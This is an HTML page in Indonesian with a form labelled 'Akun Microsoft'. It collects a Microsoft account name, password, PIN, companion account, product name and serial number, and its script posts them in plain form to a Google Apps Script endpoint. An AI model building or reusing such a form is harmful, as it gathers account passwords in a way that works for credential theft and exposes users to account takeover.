<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Akun Microsoft</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #1e3c72, #2a5298);
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    form {
      background-color: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      width: 100%;
      max-width: 400px;
      box-sizing: border-box;
      animation: fadeIn 1s ease-in-out;
    }

    h2 {
      text-align: center;
      color: #333;
      margin-bottom: 20px;
    }

    label {
      font-weight: bold;
      color: #333;
      margin-bottom: 6px;
      display: block;
    }

    input[type="text"], input[type="password"], input[type="number"] {
      width: 100%;
      padding: 12px;
      margin: 10px 0 20px 0;
      border: 2px solid #ccc;
      border-radius: 8px;
      font-size: 16px;
      transition: border-color 0.3s ease;
      box-sizing: border-box;
    }

    input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus {
      border-color: #1e3c72;
      outline: none;
    }

    input[type="text"]::placeholder, input[type="password"]::placeholder, input[type="number"]::placeholder {
      color: #999;
    }

    button {
      width: 100%;
      padding: 15px;
      background-color: #1e3c72;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.1s ease;
    }

    button:hover {
      background-color: #2a5298;
    }

    button:active {
      transform: scale(0.98);
    }

    footer {
      margin-top: 20px;
      text-align: center;
      color: #fff;
      font-weight: bold;
    }

    /* Style untuk mobile */
    @media (max-width: 480px) {
      body {
        padding: 20px;
      }

      form {
        width: 100%;
        max-width: 100%;
      }

      input[type="text"], input[type="password"], input[type="number"] {
        padding: 10px;
        font-size: 14px;
      }

      button {
        padding: 12px;
        font-size: 14px;
      }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }
  </style>
</head>
<body>

  <form id="akunMicrosoftForm">
    <h2>Akun Microsoft</h2>

    <label for="namaMicrosoft">Akun Microsoft:</label>
    <input type="text" id="namaMicrosoft" name="namaMicrosoft" placeholder="Akun Microsoft" required>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" placeholder="Password" required>

    <label for="pin">Set Up a PIN:</label>
    <input type="number" id="pin" name="pin" placeholder="PIN" required>

    <label for="akunPendamping">Akun Pendamping:</label>
    <input type="text" id="akunPendamping" name="akunPendamping" placeholder="Akun Pendamping" required>

    <label for="namaProduk">Nama Produk:</label>
    <input type="text" id="namaProduk" name="namaProduk" placeholder="Nama Produk" required>

    <label for="sn">S/N:</label>
    <input type="text" id="sn" name="sn" placeholder="S/N" required>

    <button type="submit">Submit</button>
  </form>

  <footer>
    <p>Dibuat oleh Edy Sahputra</p>
  </footer>

  <script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbz6yZfEbh69UiHysHAPr2nvRfLfMKnByuGBQCaITYcqz3AFVTiAk3-utA1QYBKxYpLg/exec';
    const form = document.getElementById('akunMicrosoftForm');

    form.addEventListener('submit', e => {
      e.preventDefault();
      const formData = new FormData(form);
      fetch(scriptURL, { method: 'POST', body: formData })
        .then(response => alert('Data berhasil dikirim!'))
        .catch(error => alert('Gagal mengirim data.'));
    });
  </script>

</body>
</html>
